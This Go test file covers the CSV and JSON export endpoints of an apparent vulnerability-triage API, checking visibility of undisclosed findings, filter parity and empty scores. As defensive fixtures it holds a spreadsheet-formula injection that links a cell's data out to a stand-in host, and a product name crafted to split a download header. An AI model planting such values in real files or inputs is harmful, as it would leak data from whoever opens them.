package httpapi_test

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"testing"
)

func TestAnExportIsTheListWithTheSameVisibility(t *testing.T) {
	// Nothing exported at all: a year with six hundred dismissals could
	// not be produced as one document. The danger is specific — an export
	// is the easiest place to build a list first and narrow it afterwards
	// — so the subject travels through the stream.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)
		// One of the two undisclosed, so the same request answers differently
		// for two people.
		if _, err := r.db.DB.NewUpdate().Table("finding").
			Set("visibility = ?", "private").
			Where(`vulnerability_id IN (SELECT id FROM "vulnerability" WHERE identifier = ?)`,
				"CVE-2026-1000").
			Exec(t.Context()); err != nil {
			t.Fatal(err)
		}

		rows := func(t *testing.T, who string) [][]string {
			t.Helper()
			got := asPerson(t, r, who, http.MethodGet, "/v1/products/mine/findings.csv", "")
			if got.Code != http.StatusOK {
				t.Fatalf("%s exporting answered %d: %s", who, got.Code, got.Body.String())
			}
			if kind := got.Header().Get("Content-Type"); !strings.HasPrefix(kind, "text/csv") {
				t.Errorf("the export came back as %q", kind)
			}
			if at := got.Header().Get("Content-Disposition"); !strings.Contains(at, ".csv") {
				t.Errorf("the export is not offered as a file: %q", at)
			}
			// Read strictly, which is the check that would have said the
			// file was ragged: the record stating what the file is about is
			// padded to the header's width, because CSV has no comment
			// convention and a short record is a document a conformant reader
			// refuses.
			reader := csv.NewReader(strings.NewReader(got.Body.String()))
			read, err := reader.ReadAll()
			if err != nil {
				t.Fatalf("%s got something that is not a spreadsheet: %v", who, err)
			}
			return read
		}

		// The line the deployment triages at is in the file, because a
		// spreadsheet opened six months later has nowhere else to learn that
		// everything below it was never in there.
		open := rows(t, "private-triage")
		if len(open) == 0 || open[0][0] != "# triaged at or above" {
			t.Fatalf("the export does not state the line: %v", open[0])
		}
		// A header row, then both findings.
		if len(open) != 4 {
			t.Fatalf("somebody who may read undisclosed work exported %d lines, want four",
				len(open))
		}

		// And somebody who may not read one of them gets a file without it.
		public := rows(t, "triager")
		if len(public) != 3 {
			t.Fatalf("somebody who may not read undisclosed work exported %d lines, want three",
				len(public))
		}
		for _, row := range public {
			if strings.Contains(strings.Join(row, " "), "CVE-2026-1000") {
				t.Error("an undisclosed finding left in somebody's export")
			}
		}

		// The filters are the list's own, so a spreadsheet and a screen cannot
		// disagree about what was asked for.
		narrowed := asPerson(t, r, "private-triage", http.MethodGet,
			"/v1/products/mine/findings.csv?severity=high", "")
		reader := csv.NewReader(strings.NewReader(narrowed.Body.String()))
		lines, err := reader.ReadAll()
		if err != nil {
			t.Fatal(err)
		}
		if len(lines) != 3 {
			t.Errorf("narrowed to high the export has %d lines, want the line, the header "+
				"and one row", len(lines))
		}
	})
}

func TestAnExportAnswersAsJSONToo(t *testing.T) {
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)
		got := asPerson(t, r, "triager", http.MethodGet,
			"/v1/products/mine/findings.json", "")
		if got.Code != http.StatusOK {
			t.Fatalf("exporting answered %d: %s", got.Code, got.Body.String())
		}
		var out struct {
			Above string `json:"triaged_at_or_above"`
			Items []struct {
				Issue     string `json:"issue"`
				Component string `json:"component"`
			} `json:"items"`
		}
		if err := json.Unmarshal(got.Body.Bytes(), &out); err != nil {
			t.Fatalf("the export is not JSON: %v (%s)", err, got.Body.String())
		}
		if out.Above == "" {
			t.Error("the export does not state the line it was taken above")
		}
		if len(out.Items) != 2 {
			t.Fatalf("the export holds %d rows, want the fixture's two", len(out.Items))
		}
		if out.Items[0].Component == "" || out.Items[0].Issue == "" {
			t.Errorf("a row came out empty: %+v", out.Items[0])
		}

		// One document, one convention. The stated fact's key was written
		// with underscores and every column name kept the spaces it is read
		// with on paper, so the same file named its fields two ways.
		var raw struct {
			Items []map[string]string `json:"items"`
		}
		if err := json.Unmarshal(got.Body.Bytes(), &raw); err != nil {
			t.Fatal(err)
		}
		if len(raw.Items) == 0 {
			t.Fatal("no rows to read the keys of")
		}
		var spaced []string
		for key := range raw.Items[0] {
			if strings.Contains(key, " ") {
				spaced = append(spaced, key)
			}
		}
		if len(spaced) != 0 {
			t.Errorf("these keys are written as they are read on paper: %v", spaced)
		}
		if _, held := raw.Items[0]["upstream_fix"]; !held {
			t.Errorf("a multi-word column is not keyed the way the stated fact is: %v",
				raw.Items[0])
		}
	})
}

func TestAnUnscoredFindingExportsWithNoScoreRatherThanAZero(t *testing.T) {
	// A file sorted by score for a release meeting put the unscored findings
	// among the genuinely 0.0-rated ones at the bottom, and a filter for
	// "below four" took every one of them. Empty is the only thing a column
	// of numbers has for "there is no number", and it is what the file's
	// schema says an empty score column means.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)
		if _, err := r.db.DB.NewUpdate().Table("vulnerability").
			Set("score_centi = NULL").Where("1 = 1").Exec(t.Context()); err != nil {
			t.Fatal(err)
		}
		got := asPerson(t, r, "triager", http.MethodGet,
			"/v1/products/mine/findings.csv", "")
		if got.Code != http.StatusOK {
			t.Fatalf("exporting answered %d: %s", got.Code, got.Body.String())
		}
		read, err := csv.NewReader(strings.NewReader(got.Body.String())).ReadAll()
		if err != nil {
			t.Fatalf("the export is not readable as CSV: %v", err)
		}
		at := -1
		for i, column := range read[1] {
			if column == "score" {
				at = i
			}
		}
		if at < 0 {
			t.Fatalf("the export has no score column: %v", read[1])
		}
		for _, row := range read[2:] {
			if row[at] != "" {
				t.Errorf("a finding with no score exported as %q", row[at])
			}
		}
	})
}

// The three lists that could be read on a screen and not taken away.
//
// The record of judgments is what an auditor is given, the review queue is
// what a manager reports a backlog from, and the by-component view is what a
// release meeting argues over — all three were copied out by hand.
//
// What each has to get right is the same thing the findings export does: the
// subject travels through the stream, so a file never holds more than the
// screen it came from.
func TestTheOtherThreeListsExportWithTheSameVisibility(t *testing.T) {
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)
		if _, err := r.db.DB.NewUpdate().Table("finding").
			Set("visibility = ?", "private").
			Where(`vulnerability_id IN (SELECT id FROM "vulnerability" WHERE identifier = ?)`,
				"CVE-2026-1000").
			Exec(t.Context()); err != nil {
			t.Fatal(err)
		}

		lines := func(t *testing.T, who, at string) [][]string {
			t.Helper()
			got := asPerson(t, r, who, http.MethodGet, at, "")
			if got.Code != http.StatusOK {
				t.Fatalf("%s exporting %s answered %d: %s", who, at, got.Code, got.Body.String())
			}
			if kind := got.Header().Get("Content-Type"); !strings.HasPrefix(kind, "text/csv") {
				t.Errorf("%s came back as %q", at, kind)
			}
			reader := csv.NewReader(strings.NewReader(got.Body.String()))
			read, err := reader.ReadAll()
			if err != nil {
				t.Fatalf("%s is not a spreadsheet: %v", at, err)
			}
			return read
		}

		// By component. Both issues sit on the fixture's one component, so
		// somebody who may read both gets a row saying two issues and somebody
		// who may not gets one saying one — the same row, counted over what
		// each may see rather than filtered afterwards.
		open := lines(t, "private-triage", "/v1/products/mine/findings/components.csv")
		public := lines(t, "triager", "/v1/products/mine/findings/components.csv")
		issuesIn := func(rows [][]string) string {
			for _, row := range rows {
				if len(row) > 4 && row[0] != "component" && row[0] != "# triaged at or above" {
					return row[4]
				}
			}
			return ""
		}
		if issuesIn(open) != "2" {
			t.Errorf("somebody who may read both saw %q issues on the component", issuesIn(open))
		}
		if issuesIn(public) != "1" {
			t.Errorf("somebody who may read one saw %q issues on the component", issuesIn(public))
		}
		if open[0][0] != "# triaged at or above" {
			t.Errorf("the by-component export does not state the line: %v", open[0])
		}

		// The record of judgments. Nothing has been judged in this fixture, so
		// what it must produce is a header and no rows — an empty answer is an
		// answer, and a file that failed to open is not.
		record := lines(t, "private-triage", "/v1/audit.csv")
		if len(record) == 0 || record[0][0] != "id" {
			t.Fatalf("the record's export has no header: %v", record)
		}
		if len(record) != 1 {
			t.Errorf("nothing has been judged and the record exported %d rows", len(record)-1)
		}

		// The review queue, likewise: nothing waits, and the columns still
		// come out so a spreadsheet opens.
		queue := lines(t, "private-triage", "/v1/review-queue.csv")
		if len(queue) == 0 || queue[0][0] != "claim" {
			t.Fatalf("the review queue's export has no header: %v", queue)
		}

		// An agreement taken back is in the record and is not somebody who
		// agrees now, and the column an auditor reads must not mix the two.
		claim, _ := r.claimed(t, "triager", "CVE-2026-9999", "linux-image", dismissal)
		// The queue is what is waiting on *you*, so the file is too: an
		// approver sees the claim and its proposer does not, and `mine`
		// reverses that. A file that answered the same for both would be a
		// backlog report about somebody else's work.
		waiting := lines(t, "reviewer", "/v1/review-queue.csv")
		if len(waiting) != 2 {
			t.Fatalf("an approver's queue exported %d rows, wanted the claim", len(waiting)-1)
		}
		theirs := lines(t, "triager", "/v1/review-queue.csv")
		if len(theirs) != 1 {
			t.Errorf("the proposer's own claim is in their queue export: %v", theirs)
		}
		own := lines(t, "triager", "/v1/review-queue.csv?mine=true")
		if len(own) != 2 {
			t.Errorf("asking for their own, the proposer exported %d rows", len(own)-1)
		}

		if got := asPerson(t, r, "reviewer", http.MethodPost,
			fmt.Sprintf("/v1/claims/%d/approval", claim),
			`{"batch":"a-batch"}`); got.Code >= 300 {
			t.Fatalf("agreeing answered %d: %s", got.Code, got.Body.String())
		}
		agreed := lines(t, "private-triage", "/v1/audit.csv")
		if len(agreed) != 2 || agreed[1][14] == "" || agreed[1][15] != "true" {
			t.Fatalf("with an agreement, the record exported %v", agreed)
		}
		if got := asPerson(t, r, "reviewer", http.MethodDelete,
			"/v1/approval-batches/a-batch", ""); got.Code >= 300 {
			t.Fatalf("taking the agreement back answered %d: %s", got.Code, got.Body.String())
		}
		back := lines(t, "private-triage", "/v1/audit.csv")
		if len(back) != 2 {
			t.Fatalf("after the agreement was taken back, the record exported %v", back)
		}
		if back[1][14] != "" {
			t.Errorf("an agreement that was taken back is still listed as agreeing: %q",
				back[1][14])
		}
		if back[1][15] != "false" {
			t.Errorf("with the agreement taken back the record still says two people: %q",
				back[1][15])
		}

		// And all three answer as JSON.
		for _, at := range []string{
			"/v1/audit.json", "/v1/review-queue.json",
			"/v1/products/mine/findings/components.json",
		} {
			got := asPerson(t, r, "private-triage", http.MethodGet, at, "")
			if got.Code != http.StatusOK {
				t.Fatalf("%s answered %d: %s", at, got.Code, got.Body.String())
			}
			var out struct {
				Items []map[string]any `json:"items"`
			}
			if err := json.Unmarshal(got.Body.Bytes(), &out); err != nil {
				t.Errorf("%s is not JSON: %v (%s)", at, err, got.Body.String())
			}
		}
	})
}

func TestAnExportAnswersTheSameQuestionAsTheListItCameFrom(t *testing.T) {
	// An export declaring its query parameters by hand rather than taking the
	// list's own is how nineteen of them went missing: a parameter the
	// endpoint does not declare is dropped before the handler runs, with no
	// error, so the screen's Export link produced a file about a different
	// population than the screen. Asserted as a comparison, because every
	// single-filter assertion passed throughout — the one filter that was
	// tested was one of the few the export still parsed.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)

		listed := func(t *testing.T, at, query string) int {
			t.Helper()
			var page struct {
				Total int `json:"total"`
			}
			read(t, r, "triager", at+"?"+query, &page)
			return page.Total
		}
		exported := func(t *testing.T, at, query string) int {
			t.Helper()
			got := asPerson(t, r, "triager", http.MethodGet, at+"?"+query, "")
			if got.Code != http.StatusOK {
				t.Fatalf("exporting %q answered %d: %s", query, got.Code, got.Body.String())
			}
			reader := csv.NewReader(strings.NewReader(got.Body.String()))
			read, err := reader.ReadAll()
			if err != nil {
				t.Fatalf("the export is not readable as CSV: %v", err)
			}
			// Every export writes a comment line and a header before its rows.
			rows := 0
			for _, line := range read {
				if len(line) > 0 && strings.HasPrefix(line[0], "#") {
					continue
				}
				rows++
			}
			return rows - 1
		}

		// One filter of each kind the hand-written list left out: a plain
		// narrowing, one that reads a date, one that walks the tree, one
		// behind the triage line, and one that changes the population
		// entirely — asking for what has closed, which this list is not about
		// and which the export could never have produced a row of.
		for _, each := range []struct{ list, file, query string }{
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", ""},
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", "tag=nothing-is-marked-this"},
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", "weakness=CWE-125"},
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", "epss_at_least=0.9"},
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", "under_build=true"},
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", "opened_after=2099-01-01"},
			{"/v1/products/mine/findings", "/v1/products/mine/findings.csv", "origin=manual"},
			{"/v1/products/mine/findings/components", "/v1/products/mine/findings/components.csv", ""},
			{"/v1/products/mine/findings/components", "/v1/products/mine/findings/components.csv", "tag=nothing-is-marked-this"},
			{"/v1/products/mine/findings/components", "/v1/products/mine/findings/components.csv", "assigned=nobody"},
		} {
			want := listed(t, each.list, each.query)
			if got := exported(t, each.file, each.query); got != want {
				t.Errorf("%s?%s lists %d and exports %d", each.list, each.query, want, got)
			}
		}
	})
}

func TestAnExportedNameCannotBeAFormula(t *testing.T) {
	// Component names arrive in somebody else's SBOM and these files are
	// opened by the people holding the most access in the deployment. A cell
	// beginning with one of these is a formula to a spreadsheet, and the row
	// beside it is this deployment's open critical findings.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)

		hostile := `=HYPERLINK("http://example.test/"&A1,"detail")`
		if _, err := r.db.DB.NewUpdate().Table("component").
			Set("name = ?", hostile).
			Where(`name = ?`, "linux-image").
			Exec(t.Context()); err != nil {
			t.Fatal(err)
		}

		got := asPerson(t, r, "triager", http.MethodGet,
			"/v1/products/mine/findings.csv", "")
		if got.Code != http.StatusOK {
			t.Fatalf("exporting answered %d: %s", got.Code, got.Body.String())
		}
		reader := csv.NewReader(strings.NewReader(got.Body.String()))
		rows, err := reader.ReadAll()
		if err != nil {
			t.Fatalf("the export is not readable as CSV: %v", err)
		}
		var found bool
		for _, row := range rows {
			for _, cell := range row {
				switch {
				case cell == "'"+hostile:
					found = true
				case strings.HasPrefix(cell, "="), strings.HasPrefix(cell, "+"),
					strings.HasPrefix(cell, "@"), strings.HasPrefix(cell, "\t"):
					t.Errorf("a cell a spreadsheet reads as a formula: %q", cell)
				}
			}
		}
		if !found {
			t.Errorf("the hostile name is not in the file, so this proves nothing: %q",
				got.Body.String())
		}
	})
}

func TestAnExportedFilenameCannotEndTheHeader(t *testing.T) {
	// The filename on the download is the product's name, and a product name
	// is checked for being usable as an identifier — not for being usable
	// inside a quoted header field. A quote ends the field early and a
	// carriage return ends the header, so a name carrying either writes
	// whatever follows it into the response's own headers.
	//
	// The catalog now refuses those characters too, but the check that has to
	// hold is this one: it covers every export, including one added later, and
	// a product declared before the catalog was tightened is still recorded.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scanned(t)

		// A quote and a semicolon, which is what actually reaches a handler:
		// a carriage return cannot travel in a request line at all, and is
		// refused a layer lower — the catalog will not record a name carrying
		// one, which is tested where that check is.
		hostile := `mine"; x="y`
		if _, err := r.db.DB.NewUpdate().Table("product").
			Set("name = ?", hostile).
			Where("name = ?", "mine").Exec(t.Context()); err != nil {
			t.Fatal(err)
		}
		got := asPerson(t, r, "triager", http.MethodGet,
			"/v1/products/"+url.PathEscape(hostile)+"/findings.csv", "")
		if got.Code != http.StatusOK {
			t.Fatalf("exporting answered %d: %s", got.Code, got.Body.String())
		}
		at := got.Header().Get("Content-Disposition")
		if strings.ContainsAny(at, "\r\n") {
			t.Errorf("the disposition header carries a line ending: %q", at)
		}
		if strings.Count(at, `"`) != 2 {
			t.Errorf("the filename is not one quoted field: %q", at)
		}
		if got.Header().Get("x") != "" {
			t.Errorf("a second header field was written by the product's name: %q", at)
		}
		if !strings.HasSuffix(at, `.csv"`) {
			t.Errorf("the file is not named as a CSV: %q", at)
		}
	})
}

func TestTheCrossProductExportCarriesTheProductAndTheVisibility(t *testing.T) {
	// The cross-product list is the screen somebody reporting upward is on,
	// and it was the one list whose answer could not leave the application:
	// every export was a product's own route. What this pins is that the file
	// is the same query with the same subject — the product as a column, and
	// an undisclosed finding absent for somebody who may not read it.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)
		if _, err := r.db.DB.NewUpdate().Table("finding").
			Set("visibility = ?", "private").
			Where(`vulnerability_id IN (SELECT id FROM "vulnerability" WHERE identifier = ?)`,
				"CVE-2026-1000").
			Exec(t.Context()); err != nil {
			t.Fatal(err)
		}

		rows := func(t *testing.T, who, asked string) [][]string {
			t.Helper()
			got := asPerson(t, r, who, http.MethodGet, "/v1/findings.csv"+asked, "")
			if got.Code != http.StatusOK {
				t.Fatalf("%s exporting answered %d: %s", who, got.Code, got.Body.String())
			}
			reader := csv.NewReader(strings.NewReader(got.Body.String()))
			read, err := reader.ReadAll()
			if err != nil {
				t.Fatalf("%s got something that is not a spreadsheet: %v", who, err)
			}
			return read
		}

		open := rows(t, "private-triage", "")
		if len(open) < 2 {
			t.Fatalf("the export has %d lines", len(open))
		}
		// Each product applies its own line, so the file says that rather than
		// naming a number that would be wrong for every product but one.
		if open[0][0] != "# triaged at or above" || open[0][1] != "each product's own line" {
			t.Errorf("the file does not say how the line was applied: %v", open[0])
		}
		// The product is the column this route exists for.
		if open[1][0] != "product" {
			t.Errorf("the first column is %q, want the product", open[1][0])
		}
		if len(open) != 4 {
			t.Fatalf("somebody who may read undisclosed work exported %d lines, want four",
				len(open))
		}
		for _, row := range open[2:] {
			if row[0] == "" {
				t.Error("a row came out with no product in it")
			}
		}

		// The same request, by somebody who may not read one of the two.
		public := rows(t, "triager", "")
		if len(public) != 3 {
			t.Fatalf("somebody who may not read undisclosed work exported %d lines, want three",
				len(public))
		}
		for _, row := range public {
			if strings.Contains(strings.Join(row, " "), "CVE-2026-1000") {
				t.Error("an undisclosed finding left in somebody's export")
			}
		}

		// And it takes the list's filters, so the file and the screen cannot
		// disagree about what was asked for.
		narrowed := rows(t, "private-triage", "?severity=high")
		if len(narrowed) != 3 {
			t.Errorf("narrowed to high the export has %d lines, want the line, the header "+
				"and one row", len(narrowed))
		}
	})
}

func TestTheTwoListsThatCouldNotLeaveTheScreenNowCan(t *testing.T) {
	// The deadline report is what somebody takes to a meeting about dates
	// and the comparison is what a release note is written from, and
	// neither could leave the screen — so both answers were retyped, and a
	// retyped list is wrong by the meeting after next.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)

		lines := func(t *testing.T, at string) [][]string {
			t.Helper()
			got := asPerson(t, r, "triager", http.MethodGet, at, "")
			if got.Code != http.StatusOK {
				t.Fatalf("exporting %s answered %d: %s", at, got.Code, got.Body.String())
			}
			reader := csv.NewReader(strings.NewReader(got.Body.String()))
			read, err := reader.ReadAll()
			if err != nil {
				t.Fatalf("the export is not readable as CSV: %v", err)
			}
			rows := make([][]string, 0, len(read))
			for _, line := range read {
				if len(line) > 0 && strings.HasPrefix(line[0], "#") {
					continue
				}
				rows = append(rows, line)
			}
			return rows
		}

		// The file holds what the screen holds. Asked as a comparison rather
		// than as a number, because every export that quietly answers a
		// narrower question passes a count assertion written against itself.
		var screen struct {
			Items []struct {
				Vulnerability string `json:"vulnerability"`
			} `json:"items"`
		}
		read(t, r, "triager", "/v1/running-out?days=365", &screen)
		if len(screen.Items) == 0 {
			t.Fatal("nothing is running out in the fixture, so the export proves nothing")
		}
		file := lines(t, "/v1/running-out.csv?days=365")
		if len(file)-1 != len(screen.Items) {
			t.Errorf("the screen lists %d and the file holds %d", len(screen.Items), len(file)-1)
		}

		// And the comparison, which is one file with a column saying which of
		// its three parts a row belongs to: three files are three chances to
		// send somebody two of them.
		r.alsoIn(t, "vs")
		changed := lines(t, "/v1/products/mine/comparison.csv"+
			"?from=master&from_variant=broadcom&to=master&to_variant=vs")
		if len(changed) == 0 || changed[0][0] != "change" {
			t.Fatalf("the comparison exports %v", changed)
		}
		for _, row := range changed[1:] {
			switch row[0] {
			case "fixed", "newly present", "still present":
			default:
				t.Errorf("a row says it changed by %q", row[0])
			}
		}
	})
}

func TestCoverageStatesTheThresholdItsQuietColumnWasComputedAgainst(t *testing.T) {
	// A true/false column whose threshold is not in the file is a column
	// nobody can check later, and coverage is the report read longest after
	// the fact: what it says is that a build stopped being scanned, which
	// only means something against a number.
	twoReach(t, func(t *testing.T, r *reach) {
		r.scannedTwoIssues(t)

		got := asPerson(t, r, "triager", http.MethodGet, "/v1/scanning.csv", "")
		if got.Code != http.StatusOK {
			t.Fatalf("exporting coverage answered %d: %s", got.Code, got.Body.String())
		}
		reader := csv.NewReader(strings.NewReader(got.Body.String()))
		lines, err := reader.ReadAll()
		if err != nil {
			t.Fatalf("coverage came back as something that is not a spreadsheet: %v", err)
		}
		if len(lines) < 3 {
			t.Fatalf("coverage exported %d lines, want the statement, the header and a build",
				len(lines))
		}
		if lines[0][0] != "# quiet after days" || lines[0][1] == "" {
			t.Errorf("coverage does not state its threshold: %v", lines[0])
		}
		// Named rather than counted from, because an index moves silently when
		// a column is added and the assertion goes on passing about the wrong
		// one. The two that matter here are the first and the quiet flag the
		// statement above was computed for.
		if lines[1][0] != "product" || indexOf(lines[1], "quiet") < 0 {
			t.Errorf("coverage's columns moved: %v", lines[1])
		}
		// The pair that tells a build nobody uploads to apart from one whose
		// uploads are refused. Both read as quiet and they are different
		// faults.
		if indexOf(lines[1], "last_refused_at") < 0 || indexOf(lines[1], "refused_because") < 0 {
			t.Errorf("coverage does not say whether anybody is trying: %v", lines[1])
		}

		// Narrowed the way the screen is. An export that built the list first
		// and narrowed it afterwards is the leak, and coverage names every
		// build there is.
		if strings.Contains(got.Body.String(), "theirs") {
			t.Error("a product the reader holds nothing on is in their coverage file")
		}
	})
}

func TestAFileWithNothingToStateStatesNothing(t *testing.T) {
	// The record has no severity line and never had one. It used to answer
	// with an empty "triaged_at_or_above", which is a key about findings on a
	// file about judgments — worse than silence, because somebody reads it.
	twoReach(t, func(t *testing.T, r *reach) {
		got := asPerson(t, r, "private-triage", http.MethodGet, "/v1/audit.json", "")
		if got.Code != http.StatusOK {
			t.Fatalf("exporting the record answered %d: %s", got.Code, got.Body.String())
		}
		var out map[string]json.RawMessage
		if err := json.Unmarshal(got.Body.Bytes(), &out); err != nil {
			t.Fatalf("the record is not JSON: %v", err)
		}
		if _, said := out["triaged_at_or_above"]; said {
			t.Error("the record's file states a severity line it does not have")
		}
		if _, there := out["items"]; !there {
			t.Errorf("the record's file has no items: %s", got.Body.String())
		}
	})
}

// indexOf is where a column sits, or -1.
//
// Used in place of a fixed position so that adding a column does not quietly
// move an assertion onto its neighbour.
func indexOf(row []string, name string) int {
	for i, each := range row {
		if each == name {
			return i
		}
	}
	return -1
}
